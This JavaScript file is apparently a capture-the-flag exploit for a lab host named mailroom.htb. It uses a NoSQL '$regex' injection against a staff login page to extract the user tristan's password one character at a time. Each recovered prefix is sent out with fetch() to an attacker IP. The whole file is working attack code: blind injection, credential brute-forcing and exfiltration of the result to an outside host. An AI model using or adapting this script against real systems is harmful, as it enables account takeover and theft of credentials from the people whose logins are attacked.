var charList = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~";
var attacker = "http://10.10.14.6:80/?pass=";

function brutePass(pass) {
	var http = new XMLHttpRequest();
	var url = 'http://staff-review-panel.mailroom.htb/auth.php';

	http.open('POST', url, true);
	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	
	http.onload = function() {
	    if (/"success":true/.test(this.responseText)) {
	    	displayToAttack(pass);
	    	sendAttempt(charList, pass);
	    }
	}
	
	http.send("email=tristan@mailroom.htb&password[$regex]=^"+pass);
}

function displayToAttack(pass) { fetch(attacker+pass); }

function sendAttempt(chars, pass) {
	for (var i = 0; i < chars.length; i++) {
		brutePass(pass+chars[i])
		console.log(pass+chars[i]);
		displayToAttack(pass);
	}
}

sendAttempt(charList, "");